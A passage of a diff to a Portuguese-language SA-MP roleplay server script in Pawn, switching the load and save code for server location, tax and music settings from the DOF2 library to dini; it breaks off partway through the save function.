+		oInfo[0][VenderVeiculoZ] = dini_Float(ficheiro, "VenderVeiculoZ");
+		oInfo[0][CamaraMunicipalX] = dini_Float(ficheiro, "CamaraMunicipalX");
+		oInfo[0][CamaraMunicipalY] = dini_Float(ficheiro, "CamaraMunicipalY");
+		oInfo[0][CamaraMunicipalZ] = dini_Float(ficheiro, "CamaraMunicipalZ");
+		oInfo[0][CamaraMunicipalVirtualWorld] = dini_Int(ficheiro, "CamaraMunicipalVirtualWorld");
+		oInfo[0][CamaraMunicipalInterior] = dini_Int(ficheiro, "CamaraMunicipalInterior");
+		oInfo[0][CamaraMunicipalPickupID] = dini_Int(ficheiro, "CamaraMunicipalPickupID");
+		format(oInfo[0][NewsMusica1], 128, "%s", dini_Get(ficheiro, "NewsMusica1"));
+		format(oInfo[0][NewsMusica2], 128, "%s", dini_Get(ficheiro, "NewsMusica2"));
+		format(oInfo[0][NewsMusica3], 128, "%s", dini_Get(ficheiro, "NewsMusica3"));
+		format(oInfo[0][NewsMusica4], 128, "%s", dini_Get(ficheiro, "NewsMusica4"));
+		format(oInfo[0][NewsMusica5], 128, "%s", dini_Get(ficheiro, "NewsMusica5"));
+		format(oInfo[0][NewsMusica6], 128, "%s", dini_Get(ficheiro, "NewsMusica6"));
+ 		format(oInfo[0][NewsMusica1Alterador], 32, "%s", dini_Get(ficheiro, "NewsMusica1Alterador"));
+		format(oInfo[0][NewsMusica2Alterador], 32, "%s", dini_Get(ficheiro, "NewsMusica2Alterador"));
+		format(oInfo[0][NewsMusica3Alterador], 32, "%s", dini_Get(ficheiro, "NewsMusica3Alterador"));
+		format(oInfo[0][NewsMusica4Alterador], 32, "%s", dini_Get(ficheiro, "NewsMusica4Alterador"));
+		format(oInfo[0][NewsMusica5Alterador], 32, "%s", dini_Get(ficheiro, "NewsMusica5Alterador"));
+		format(oInfo[0][NewsMusica6Alterador], 32, "%s", dini_Get(ficheiro, "NewsMusica6Alterador"));
+ 		format(oInfo[0][NewsMusica1Nome], 32, "%s", dini_Get(ficheiro, "NewsMusica1Nome"));
+		format(oInfo[0][NewsMusica2Nome], 32, "%s", dini_Get(ficheiro, "NewsMusica2Nome"));
+		format(oInfo[0][NewsMusica3Nome], 32, "%s", dini_Get(ficheiro, "NewsMusica3Nome"));
+		format(oInfo[0][NewsMusica4Nome], 32, "%s", dini_Get(ficheiro, "NewsMusica4Nome"));
+		format(oInfo[0][NewsMusica5Nome], 32, "%s", dini_Get(ficheiro, "NewsMusica5Nome"));
+		format(oInfo[0][NewsMusica6Nome], 32, "%s", dini_Get(ficheiro, "NewsMusica6Nome"));
+		oInfo[0][ImpostoCarros] = dini_Int(ficheiro, "ImpostoCarros");
+		oInfo[0][ImpostoCasas] = dini_Int(ficheiro, "ImpostoCasas");
+		oInfo[0][ImpostoLojas] = dini_Int(ficheiro, "ImpostoLojas");
+		oInfo[0][AeroportoX] = dini_Float(ficheiro, "AeroportoX");
+		oInfo[0][AeroportoY] = dini_Float(ficheiro, "AeroportoY");
+		oInfo[0][AeroportoZ] = dini_Float(ficheiro, "AeroportoZ");
+		oInfo[0][AeroportoVirtualWorld] = dini_Int(ficheiro, "AeroportoVirtualWorld");
+		oInfo[0][AeroportoInterior] = dini_Int(ficheiro, "AeroportoInterior");
+		oInfo[0][AeroportoPickupID] = dini_Int(ficheiro, "AeroportoPickupID");
+   		oInfo[0][ComprarIscoX] = dini_Float(ficheiro, "ComprarIscoX");
+		oInfo[0][ComprarIscoY] = dini_Float(ficheiro, "ComprarIscoY");
+		oInfo[0][ComprarIscoZ] = dini_Float(ficheiro, "ComprarIscoZ");
+		oInfo[0][ComprarIscoVirtualWorld] = dini_Int(ficheiro, "ComprarIscoVirtualWorld");
+		oInfo[0][ComprarIscoInterior] = dini_Int(ficheiro, "ComprarIscoInterior");
+        oInfo[0][ComprarIscoPickupID] = dini_Int(ficheiro, "ComprarIscoPickupID");
+   		oInfo[0][LotaX] = dini_Float(ficheiro, "LotaX");
+		oInfo[0][LotaY] = dini_Float(ficheiro, "LotaY");
+		oInfo[0][LotaZ] = dini_Float(ficheiro, "LotaZ");
+		oInfo[0][LotaVirtualWorld] = dini_Int(ficheiro, "LotaVirtualWorld");
+		oInfo[0][LotaInterior] = dini_Int(ficheiro, "LotaInterior");
+        oInfo[0][LotaPickupID] = dini_Int(ficheiro, "LotaPickupID");
+   		oInfo[0][FabricaX] = dini_Float(ficheiro, "FabricaX");
+		oInfo[0][FabricaY] = dini_Float(ficheiro, "FabricaY");
+		oInfo[0][FabricaZ] = dini_Float(ficheiro, "FabricaZ");
+		oInfo[0][FabricaVirtualWorld] = dini_Int(ficheiro, "FabricaVirtualWorld");
+		oInfo[0][FabricaInterior] = dini_Int(ficheiro, "FabricaInterior");
+        oInfo[0][FabricaPickupID] = dini_Int(ficheiro, "FabricaPickupID");
+
  		AeroportoPickup = CreateDynamicPickup(oInfo[0][AeroportoPickupID], 1, oInfo[0][AeroportoX], oInfo[0][AeroportoY], oInfo[0][AeroportoZ], -1, -1, -1, 100.0);
 		AeroportoLabel = CreateDynamic3DTextLabel("{99FF00}[ {FFFFFF}Comprar bilhete 100$ {99FF00}]\n '/comprarbilhete'", COLOR_WHITE, oInfo[0][AeroportoX], oInfo[0][AeroportoY], oInfo[0][AeroportoZ], 10, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);
-		
+
 		CamaraMunicipalPickup = CreateDynamicPickup(oInfo[0][CamaraMunicipalPickupID], 1, oInfo[0][CamaraMunicipalX], oInfo[0][CamaraMunicipalY], oInfo[0][CamaraMunicipalZ], -1, -1, -1, 100.0);
 		CamaraMunicipalLabel = CreateDynamic3DTextLabel("{99FF00}[ {FFFFFF}Câmara Municipal {99FF00}]\n 'n'", COLOR_WHITE, oInfo[0][CamaraMunicipalX], oInfo[0][CamaraMunicipalY], oInfo[0][CamaraMunicipalZ], 10, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);
-		
+
         VenderVeiculoLabel = CreateDynamic3DTextLabel("{99FF00}[ {FFFFFF}/venderveiculo {99FF00}]", COLOR_WHITE, oInfo[0][VenderVeiculoX], oInfo[0][VenderVeiculoY], oInfo[0][VenderVeiculoZ], 6, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);
 
 		PoliciaPickup = CreateDynamicPickup(oInfo[0][PoliciaPickupID], 1, oInfo[0][PoliciaX], oInfo[0][PoliciaY], oInfo[0][PoliciaZ], -1, -1, -1, 100.0);
 		PoliciaLabel = CreateDynamic3DTextLabel("{99FF00}[ {FFFFFF}Balcão PSP {99FF00}]\n 'n'", COLOR_WHITE, oInfo[0][PoliciaX], oInfo[0][PoliciaY], oInfo[0][PoliciaZ], 10, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);
-        
+
         BancoPickup[0] = CreateDynamicPickup(oInfo[0][Banco1PickupID], 1, oInfo[0][Banco1X], oInfo[0][Banco1Y], oInfo[0][Banco1Z], -1, -1, -1, 100.0);
         BancoLabel[0] = CreateDynamic3DTextLabel("{99FF00}[ {FFFFFF}Banco {99FF00}]\n 'n'", COLOR_WHITE, oInfo[0][Banco1X], oInfo[0][Banco1Y], oInfo[0][Banco1Z], 10, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);
 
@@ -13360,13 +13334,13 @@ public CarregarOutros()
 
 		TunningPickup = CreateDynamicPickup(oInfo[0][TunningPickupID], 1, oInfo[0][TunningX], oInfo[0][TunningY], oInfo[0][TunningZ], -1, -1, -1, 100.0);
 		TunningLabel = CreateDynamic3DTextLabel("{99FF00}[ {FFFFFF}Zona de Tuning {99FF00}]\n 'n'", COLOR_WHITE, oInfo[0][TunningX], oInfo[0][TunningY], oInfo[0][TunningZ], 10, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);
-		
+
 		LicPickup = CreateDynamicPickup(oInfo[0][LicPickupID], 1, oInfo[0][LicX], oInfo[0][LicY], oInfo[0][LicZ], -1, -1, -1, 100.0);
 		LicLabel = CreateDynamic3DTextLabel("{99FF00}[ {FFFFFF}/licencas {99FF00}]", COLOR_WHITE, oInfo[0][LicX], oInfo[0][LicY], oInfo[0][LicZ], 6, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);
 
         CEPickup = CreateDynamicPickup(oInfo[0][EmpregoPickupID], 1, oInfo[0][EmpregoX], oInfo[0][EmpregoY], oInfo[0][EmpregoZ], -1, -1, -1, 100.0);
 		CELabel = CreateDynamic3DTextLabel("{99FF00}[ {FFFFFF}Centro de Emprego {99FF00}] \n{99FF00}'n'", COLOR_WHITE, oInfo[0][EmpregoX], oInfo[0][EmpregoY], oInfo[0][EmpregoZ], 6, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);
-		
+
 		PrenderLabel = CreateDynamic3DTextLabel("{99FF00}[ {FFFFFF}Zona de Prender {99FF00}]", COLOR_WHITE, oInfo[0][PrenderX], oInfo[0][PrenderY], oInfo[0][PrenderZ], 6, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);
 
 		IscoPickup = CreateDynamicPickup(oInfo[0][ComprarIscoPickupID], 1, oInfo[0][ComprarIscoX], oInfo[0][ComprarIscoY], oInfo[0][ComprarIscoZ], -1, -1, -1, 100.0);
@@ -13374,13 +13348,13 @@ public CarregarOutros()
 
 		LotaPickup = CreateDynamicPickup(oInfo[0][LotaPickupID], 1, oInfo[0][LotaX], oInfo[0][LotaY], oInfo[0][LotaZ], -1, -1, -1, 100.0);
 		LotaLabel = CreateDynamic3DTextLabel("{99FF00}[ {FFFFFF}Lota {99FF00}] \n{99FF00}'/venderpeixe'", COLOR_WHITE, oInfo[0][LotaX], oInfo[0][LotaY], oInfo[0][LotaZ], 6, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);
-		
+
 		FabricaPickup = CreateDynamicPickup(oInfo[0][FabricaPickupID], 1, oInfo[0][FabricaX], oInfo[0][FabricaY], oInfo[0][FabricaZ], -1, -1, -1, 100.0);
 		FabricaLabel = CreateDynamic3DTextLabel("{99FF00}[ {FFFFFF}Fábrica {99FF00}] \n{99FF00}'/comprarprodutos'", COLOR_WHITE, oInfo[0][FabricaX], oInfo[0][FabricaY], oInfo[0][FabricaZ], 6, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);
 	}
-	
+
 	tick2 = GetTickCount();
-	printf("\n [PC:RP] Outros carregados [Total de registos: %d] (%d ms)", oInfo[0][RegistoCounter], tick2-tick1);
+	printf(" [PC:RP] Outros carregados [Total de registos: %d] (%d ms)", oInfo[0][RegistoCounter], tick2-tick1);
 
 	return 1;
 }
@@ -13391,126 +13365,124 @@ public GuardarOutros()
 
 	format(ficheiro, sizeof(ficheiro), "PCRP/Outros/Outros.ini");
 
-	DOF2_SetInt(ficheiro, "RegistoCounter", oInfo[0][RegistoCounter]);
-	DOF2_SetFloat(ficheiro, "LicX", oInfo[0][LicX]);
-	DOF2_SetFloat(ficheiro, "LicY", oInfo[0][LicY]);
-	DOF2_SetFloat(ficheiro, "LicZ", oInfo[0][LicZ]);
-	DOF2_SetInt(ficheiro, "LicPickupID", oInfo[0][LicPickupID]);
-	DOF2_SetInt(ficheiro, "LicVirtualWorld", oInfo[0][LicVirtualWorld]);
-	DOF2_SetInt(ficheiro, "LicInterior", oInfo[0][LicInterior]);
-	DOF2_SetFloat(ficheiro, "EmpregoX", oInfo[0][EmpregoX]);
-	DOF2_SetFloat(ficheiro, "EmpregoY", oInfo[0][EmpregoY]);
-	DOF2_SetFloat(ficheiro, "EmpregoZ", oInfo[0][EmpregoZ]);
-	DOF2_SetInt(ficheiro, "EmpregoPickupID", oInfo[0][EmpregoPickupID]);
-	DOF2_SetInt(ficheiro, "EmpregoVirtualWorld", oInfo[0][EmpregoVirtualWorld]);
-	DOF2_SetInt(ficheiro, "EmpregoInterior", oInfo[0][EmpregoInterior]);
-	DOF2_SetFloat(ficheiro, "PrenderX", oInfo[0][PrenderX]);
-	DOF2_SetFloat(ficheiro, "PrenderY", oInfo[0][PrenderY]);
-	DOF2_SetFloat(ficheiro, "PrenderZ", oInfo[0][PrenderZ]);
-	DOF2_SetInt(ficheiro, "PrenderVirtualWorld", oInfo[0][PrenderVirtualWorld]);
-	DOF2_SetInt(ficheiro, "PrenderInterior", oInfo[0][PrenderInterior]);
-	DOF2_SetInt(ficheiro, "Impostos", oInfo[0][PrenderVirtualWorld]);
-	DOF2_SetInt(ficheiro, "FundoDesemprego", oInfo[0][PrenderInterior]);
-	DOF2_SetFloat(ficheiro, "ComprarDrogasX", oInfo[0][ComprarDrogasX]);
-	DOF2_SetFloat(ficheiro, "ComprarDrogasY", oInfo[0][ComprarDrogasY]);
-	DOF2_SetFloat(ficheiro, "ComprarDrogasZ", oInfo[0][ComprarDrogasZ]);
-	DOF2_SetInt(ficheiro, "ComprarDrogasVirtualWorld", oInfo[0][ComprarDrogasVirtualWorld]);
-	DOF2_SetInt(ficheiro, "ComprarDrogasInterior", oInfo[0][ComprarDrogasInterior]);
-	DOF2_SetFloat(ficheiro, "ComprarMateriaisX", oInfo[0][ComprarMateriaisX]);
-	DOF2_SetFloat(ficheiro, "ComprarMateriaisY", oInfo[0][ComprarMateriaisY]);
-	DOF2_SetFloat(ficheiro, "ComprarMateriaisZ", oInfo[0][ComprarMateriaisZ]);
-	DOF2_SetInt(ficheiro, "ComprarMateriaisVirtualWorld", oInfo[0][ComprarMateriaisVirtualWorld]);
-	DOF2_SetInt(ficheiro, "ComprarMateriaisInterior", oInfo[0][ComprarMateriaisInterior]);
-	DOF2_SetFloat(ficheiro, "EntregarDrogasX", oInfo[0][ComprarDrogasX]);
-	DOF2_SetFloat(ficheiro, "EntregarDrogasY", oInfo[0][ComprarDrogasY]);
-	DOF2_SetFloat(ficheiro, "EntregarDrogasZ", oInfo[0][ComprarDrogasZ]);
-	DOF2_SetInt(ficheiro, "EntregarDrogasVirtualWorld", oInfo[0][ComprarDrogasVirtualWorld]);
-	DOF2_SetInt(ficheiro, "EntregarDrogasInterior", oInfo[0][EntregarDrogasInterior]);
-	DOF2_SetFloat(ficheiro, "EntregarMateriaisX", oInfo[0][EntregarMateriaisX]);
-	DOF2_SetFloat(ficheiro, "EntregarMateriaisY", oInfo[0][EntregarMateriaisY]);
-	DOF2_SetFloat(ficheiro, "EntregarMateriaisZ", oInfo[0][EntregarMateriaisZ]);
-	DOF2_SetInt(ficheiro, "EntregarMateriaisVirtualWorld", oInfo[0][EntregarMateriaisVirtualWorld]);
-	DOF2_SetInt(ficheiro, "EntregarMateriaisInterior", oInfo[0][EntregarMateriaisInterior]);
-	DOF2_SetFloat(ficheiro, "TunningX", oInfo[0][TunningX]);
-	DOF2_SetFloat(ficheiro, "TunningY", oInfo[0][TunningY]);
-	DOF2_SetFloat(ficheiro, "TunningZ", oInfo[0][TunningZ]);
-	DOF2_SetInt(ficheiro, "TunningVirtualWorld", oInfo[0][TunningVirtualWorld]);
-	DOF2_SetInt(ficheiro, "TunningInterior", oInfo[0][TunningInterior]);
-	DOF2_SetInt(ficheiro, "TunningPickupID", oInfo[0][TunningPickupID]);
-	DOF2_SetFloat(ficheiro, "Banco1X", oInfo[0][Banco1X]);
-	DOF2_SetFloat(ficheiro, "Banco1Y", oInfo[0][Banco1Y]);
-	DOF2_SetFloat(ficheiro, "Banco1Z", oInfo[0][Banco1Z]);
-	DOF2_SetInt(ficheiro, "Banco1VirtualWorld", oInfo[0][Banco1VirtualWorld]);
-	DOF2_SetInt(ficheiro, "Banco1Interior,", oInfo[0][Banco1Interior]);
-	DOF2_SetInt(ficheiro, "Banco1PickupID", oInfo[0][Banco1PickupID]);
-	DOF2_SetFloat(ficheiro, "Banco2X", oInfo[0][Banco2X]);
-	DOF2_SetFloat(ficheiro, "Banco2Y", oInfo[0][Banco2Y]);
-	DOF2_SetFloat(ficheiro, "Banco2Z", oInfo[0][Banco2Z]);
-	DOF2_SetInt(ficheiro, "Banco2VirtualWorld", oInfo[0][Banco2VirtualWorld]);
-	DOF2_SetInt(ficheiro, "Banco2Interior,", oInfo[0][Banco2Interior]);
-	DOF2_SetInt(ficheiro, "Banco2PickupID", oInfo[0][Banco2PickupID]);
-	DOF2_SetInt(ficheiro, "PrecoAtestarG", oInfo[0][PrecoAtestarG]);
-	DOF2_SetFloat(ficheiro, "PoliciaX", oInfo[0][PoliciaX]);
-	DOF2_SetFloat(ficheiro, "PoliciaY", oInfo[0][PoliciaY]);
-	DOF2_SetFloat(ficheiro, "PoliciaZ", oInfo[0][PoliciaZ]);
-	DOF2_SetInt(ficheiro, "PoliciaVirtualWorld", oInfo[0][PoliciaVirtualWorld]);
-	DOF2_SetInt(ficheiro, "PoliciaInterior", oInfo[0][PoliciaInterior]);
-	DOF2_SetInt(ficheiro, "PoliciaPickupID", oInfo[0][PoliciaPickupID]);
-	DOF2_SetFloat(ficheiro, "TunningX", oInfo[0][TunningX]);
-	DOF2_SetFloat(ficheiro, "TunningY", oInfo[0][TunningY]);
-	DOF2_SetFloat(ficheiro, "TunningZ", oInfo[0][TunningZ]);
-	DOF2_SetInt(ficheiro, "TunningVirtualWorld", oInfo[0][TunningVirtualWorld]);
-	DOF2_SetInt(ficheiro, "TunningInterior", oInfo[0][TunningInterior]);
-	DOF2_SetFloat(ficheiro, "ApreendidosX", oInfo[0][ApreendidosX]);
-	DOF2_SetFloat(ficheiro, "ApreendidosY", oInfo[0][ApreendidosY]);
-	DOF2_SetFloat(ficheiro, "ApreendidosZ", oInfo[0][ApreendidosZ]);
-	DOF2_SetFloat(ficheiro, "ApreendidosA", oInfo[0][ApreendidosA]);
-	DOF2_SetInt(ficheiro, "ApreendidosVirtualWorld", oInfo[0][ApreendidosVirtualWorld]);
-	DOF2_SetInt(ficheiro, "ApreendidosInterior", oInfo[0][ApreendidosInterior]);
-	DOF2_SetFloat(ficheiro, "EntradaApreendidosX", oInfo[0][EntradaApreendidosX]);
-	DOF2_SetFloat(ficheiro, "EntradaApreendidosY", oInfo[0][EntradaApreendidosY]);
-	DOF2_SetFloat(ficheiro, "EntradaApreendidosZ", oInfo[0][EntradaApreendidosZ]);
-	DOF2_SetFloat(ficheiro, "EntradaApreendidosA", oInfo[0][EntradaApreendidosA]);
-	DOF2_SetInt(ficheiro, "EntradaApreendidosVirtualWorld", oInfo[0][EntradaApreendidosVirtualWorld]);
-	DOF2_SetInt(ficheiro, "EntradaApreendidosInterior", oInfo[0][EntradaApreendidosInterior]);
-	DOF2_SetFloat(ficheiro, "VenderVeiculoX", oInfo[0][VenderVeiculoX]);
-	DOF2_SetFloat(ficheiro, "VenderVeiculoY", oInfo[0][VenderVeiculoY]);
-	DOF2_SetFloat(ficheiro, "VenderVeiculoZ", oInfo[0][VenderVeiculoZ]);
-	DOF2_SetFloat(ficheiro, "CamaraMunicipalX", oInfo[0][CamaraMunicipalX]);
-	DOF2_SetFloat(ficheiro, "CamaraMunicipalY", oInfo[0][CamaraMunicipalY]);
-	DOF2_SetFloat(ficheiro, "CamaraMunicipalZ", oInfo[0][CamaraMunicipalZ]);
-	DOF2_SetInt(ficheiro, "CamaraMunicipalVirtualWorld", oInfo[0][CamaraMunicipalVirtualWorld]);
-	DOF2_SetInt(ficheiro, "CamaraMunicipalInterior", oInfo[0][CamaraMunicipalInterior]);
-	DOF2_SetInt(ficheiro, "CamaraMunicipalPickupID", oInfo[0][CamaraMunicipalPickupID]);
-	DOF2_SetString(ficheiro, "NewsMusica1", oInfo[0][NewsMusica1]);
-	DOF2_SetString(ficheiro, "NewsMusica2", oInfo[0][NewsMusica2]);
-	DOF2_SetString(ficheiro, "NewsMusica3", oInfo[0][NewsMusica3]);
-	DOF2_SetString(ficheiro, "NewsMusica4", oInfo[0][NewsMusica4]);
-	DOF2_SetString(ficheiro, "NewsMusica5", oInfo[0][NewsMusica5]);
-	DOF2_SetString(ficheiro, "NewsMusica6", oInfo[0][NewsMusica6]);
-	DOF2_SetString(ficheiro, "NewsMusica1Alterador", oInfo[0][NewsMusica1Alterador]);
-	DOF2_SetString(ficheiro, "NewsMusica2Alterador", oInfo[0][NewsMusica2Alterador]);
-	DOF2_SetString(ficheiro, "NewsMusica3Alterador", oInfo[0][NewsMusica3Alterador]);
-	DOF2_SetString(ficheiro, "NewsMusica4Alterador", oInfo[0][NewsMusica4Alterador]);
-	DOF2_SetString(ficheiro, "NewsMusica5Alterador", oInfo[0][NewsMusica5Alterador]);
-	DOF2_SetString(ficheiro, "NewsMusica6Alterador", oInfo[0][NewsMusica6Alterador]);
-	DOF2_SetString(ficheiro, "NewsMusica1Nome", oInfo[0][NewsMusica1Nome]);
-	DOF2_SetString(ficheiro, "NewsMusica2Nome", oInfo[0][NewsMusica2Nome]);
-	DOF2_SetString(ficheiro, "NewsMusica3Nome", oInfo[0][NewsMusica3Nome]);
-	DOF2_SetString(ficheiro, "NewsMusica4Nome", oInfo[0][NewsMusica4Nome]);
-	DOF2_SetString(ficheiro, "NewsMusica5Nome", oInfo[0][NewsMusica5Nome]);
-	DOF2_SetString(ficheiro, "NewsMusica6Nome", oInfo[0][NewsMusica6Nome]);
-	DOF2_SetInt(ficheiro, "ImpostoCarros", oInfo[0][ImpostoCarros]);
-	DOF2_SetInt(ficheiro, "ImpostoCasas", oInfo[0][ImpostoCasas]);
-	DOF2_SetInt(ficheiro, "ImpostoLojas", oInfo[0][ImpostoLojas]);
-	DOF2_SetFloat(ficheiro, "AeroportoX", oInfo[0][AeroportoX]);
-	DOF2_SetFloat(ficheiro, "AeroportoY", oInfo[0][AeroportoY]);
-	DOF2_SetFloat(ficheiro, "AeroportoZ", oInfo[0][AeroportoZ]);
-	DOF2_SetInt(ficheiro, "AeroportoVirtualWorld", oInfo[0][AeroportoVirtualWorld]);
-	DOF2_SetInt(ficheiro, "AeroportoInterior", oInfo[0][AeroportoInterior]);
-	DOF2_SetInt(ficheiro, "AeroportoPickupID", oInfo[0][AeroportoPickupID]);
-	
-	DOF2_SaveFile();
+	dini_IntSet(ficheiro, "RegistoCounter", oInfo[0][RegistoCounter]);
+	dini_FloatSet(ficheiro, "LicX", oInfo[0][LicX]);
+	dini_FloatSet(ficheiro, "LicY", oInfo[0][LicY]);
+	dini_FloatSet(ficheiro, "LicZ", oInfo[0][LicZ]);
+	dini_IntSet(ficheiro, "LicPickupID", oInfo[0][LicPickupID]);
+	dini_IntSet(ficheiro, "LicVirtualWorld", oInfo[0][LicVirtualWorld]);
+	dini_IntSet(ficheiro, "LicInterior", oInfo[0][LicInterior]);
+	dini_FloatSet(ficheiro, "EmpregoX", oInfo[0][EmpregoX]);
+	dini_FloatSet(ficheiro, "EmpregoY", oInfo[0][EmpregoY]);
+	dini_FloatSet(ficheiro, "EmpregoZ", oInfo[0][EmpregoZ]);
+	dini_IntSet(ficheiro, "EmpregoPickupID", oInfo[0][EmpregoPickupID]);
+	dini_IntSet(ficheiro, "EmpregoVirtualWorld", oInfo[0][EmpregoVirtualWorld]);
+	dini_IntSet(ficheiro, "EmpregoInterior", oInfo[0][EmpregoInterior]);
+	dini_FloatSet(ficheiro, "PrenderX", oInfo[0][PrenderX]);
+	dini_FloatSet(ficheiro, "PrenderY", oInfo[0][PrenderY]);
+	dini_FloatSet(ficheiro, "PrenderZ", oInfo[0][PrenderZ]);
+	dini_IntSet(ficheiro, "PrenderVirtualWorld", oInfo[0][PrenderVirtualWorld]);
+	dini_IntSet(ficheiro, "PrenderInterior", oInfo[0][PrenderInterior]);
+	dini_IntSet(ficheiro, "Impostos", oInfo[0][PrenderVirtualWorld]);
+	dini_IntSet(ficheiro, "FundoDesemprego", oInfo[0][PrenderInterior]);
+	dini_FloatSet(ficheiro, "ComprarDrogasX", oInfo[0][ComprarDrogasX]);
+	dini_FloatSet(ficheiro, "ComprarDrogasY", oInfo[0][ComprarDrogasY]);
+	dini_FloatSet(ficheiro, "ComprarDrogasZ", oInfo[0][ComprarDrogasZ]);
+	dini_IntSet(ficheiro, "ComprarDrogasVirtualWorld", oInfo[0][ComprarDrogasVirtualWorld]);
+	dini_IntSet(ficheiro, "ComprarDrogasInterior", oInfo[0][ComprarDrogasInterior]);
+	dini_FloatSet(ficheiro, "ComprarMateriaisX", oInfo[0][ComprarMateriaisX]);
+	dini_FloatSet(ficheiro, "ComprarMateriaisY", oInfo[0][ComprarMateriaisY]);
+	dini_FloatSet(ficheiro, "ComprarMateriaisZ", oInfo[0][ComprarMateriaisZ]);
+	dini_IntSet(ficheiro, "ComprarMateriaisVirtualWorld", oInfo[0][ComprarMateriaisVirtualWorld]);
+	dini_IntSet(ficheiro, "ComprarMateriaisInterior", oInfo[0][ComprarMateriaisInterior]);
+	dini_FloatSet(ficheiro, "EntregarDrogasX", oInfo[0][ComprarDrogasX]);
+	dini_FloatSet(ficheiro, "EntregarDrogasY", oInfo[0][ComprarDrogasY]);
+	dini_FloatSet(ficheiro, "EntregarDrogasZ", oInfo[0][ComprarDrogasZ]);
+	dini_IntSet(ficheiro, "EntregarDrogasVirtualWorld", oInfo[0][ComprarDrogasVirtualWorld]);
+	dini_IntSet(ficheiro, "EntregarDrogasInterior", oInfo[0][EntregarDrogasInterior]);
+	dini_FloatSet(ficheiro, "EntregarMateriaisX", oInfo[0][EntregarMateriaisX]);
+	dini_FloatSet(ficheiro, "EntregarMateriaisY", oInfo[0][EntregarMateriaisY]);
+	dini_FloatSet(ficheiro, "EntregarMateriaisZ", oInfo[0][EntregarMateriaisZ]);
+	dini_IntSet(ficheiro, "EntregarMateriaisVirtualWorld", oInfo[0][EntregarMateriaisVirtualWorld]);
+	dini_IntSet(ficheiro, "EntregarMateriaisInterior", oInfo[0][EntregarMateriaisInterior]);
+	dini_FloatSet(ficheiro, "TunningX", oInfo[0][TunningX]);
+	dini_FloatSet(ficheiro, "TunningY", oInfo[0][TunningY]);
+	dini_FloatSet(ficheiro, "TunningZ", oInfo[0][TunningZ]);
+	dini_IntSet(ficheiro, "TunningVirtualWorld", oInfo[0][TunningVirtualWorld]);
+	dini_IntSet(ficheiro, "TunningInterior", oInfo[0][TunningInterior]);
+	dini_IntSet(ficheiro, "TunningPickupID", oInfo[0][TunningPickupID]);
+	dini_FloatSet(ficheiro, "Banco1X", oInfo[0][Banco1X]);
+	dini_FloatSet(ficheiro, "Banco1Y", oInfo[0][Banco1Y]);
+	dini_FloatSet(ficheiro, "Banco1Z", oInfo[0][Banco1Z]);
+	dini_IntSet(ficheiro, "Banco1VirtualWorld", oInfo[0][Banco1VirtualWorld]);
+	dini_IntSet(ficheiro, "Banco1Interior", oInfo[0][Banco1Interior]);
+	dini_IntSet(ficheiro, "Banco1PickupID", oInfo[0][Banco1PickupID]);
+	dini_FloatSet(ficheiro, "Banco2X", oInfo[0][Banco2X]);
+	dini_FloatSet(ficheiro, "Banco2Y", oInfo[0][Banco2Y]);
+	dini_FloatSet(ficheiro, "Banco2Z", oInfo[0][Banco2Z]);
+	dini_IntSet(ficheiro, "Banco2VirtualWorld", oInfo[0][Banco2VirtualWorld]);
+	dini_IntSet(ficheiro, "Banco2Interior", oInfo[0][Banco2Interior]);
+	dini_IntSet(ficheiro, "Banco2PickupID", oInfo[0][Banco2PickupID]);
+	dini_IntSet(ficheiro, "PrecoAtestarG", oInfo[0][PrecoAtestarG]);
+	dini_FloatSet(ficheiro, "PoliciaX", oInfo[0][PoliciaX]);
+	dini_FloatSet(ficheiro, "PoliciaY", oInfo[0][PoliciaY]);
+	dini_FloatSet(ficheiro, "PoliciaZ", oInfo[0][PoliciaZ]);
+	dini_IntSet(ficheiro, "PoliciaVirtualWorld", oInfo[0][PoliciaVirtualWorld]);
+	dini_IntSet(ficheiro, "PoliciaInterior", oInfo[0][PoliciaInterior]);
+	dini_IntSet(ficheiro, "PoliciaPickupID", oInfo[0][PoliciaPickupID]);
+	dini_FloatSet(ficheiro, "TunningX", oInfo[0][TunningX]);
+	dini_FloatSet(ficheiro, "TunningY", oInfo[0][TunningY]);
+	dini_FloatSet(ficheiro, "TunningZ", oInfo[0][TunningZ]);
+	dini_IntSet(ficheiro, "TunningVirtualWorld", oInfo[0][TunningVirtualWorld]);
+	dini_IntSet(ficheiro, "TunningInterior", oInfo[0][TunningInterior]);
+	dini_FloatSet(ficheiro, "ApreendidosX", oInfo[0][ApreendidosX]);
+	dini_FloatSet(ficheiro, "ApreendidosY", oInfo[0][ApreendidosY]);
+	dini_FloatSet(ficheiro, "ApreendidosZ", oInfo[0][ApreendidosZ]);
+	dini_FloatSet(ficheiro, "ApreendidosA", oInfo[0][ApreendidosA]);
+	dini_IntSet(ficheiro, "ApreendidosVirtualWorld", oInfo[0][ApreendidosVirtualWorld]);
+	dini_IntSet(ficheiro, "ApreendidosInterior", oInfo[0][ApreendidosInterior]);
+	dini_FloatSet(ficheiro, "EntradaApreendidosX", oInfo[0][EntradaApreendidosX]);
+	dini_FloatSet(ficheiro, "EntradaApreendidosY", oInfo[0][EntradaApreendidosY]);
+	dini_FloatSet(ficheiro, "EntradaApreendidosZ", oInfo[0][EntradaApreendidosZ]);
+	dini_FloatSet(ficheiro, "EntradaApreendidosA", oInfo[0][EntradaApreendidosA]);
+	dini_IntSet(ficheiro, "EntradaApreendidosVirtualWorld", oInfo[0][EntradaApreendidosVirtualWorld]);
+	dini_IntSet(ficheiro, "EntradaApreendidosInterior", oInfo[0][EntradaApreendidosInterior]);
+	dini_FloatSet(ficheiro, "VenderVeiculoX", oInfo[0][VenderVeiculoX]);
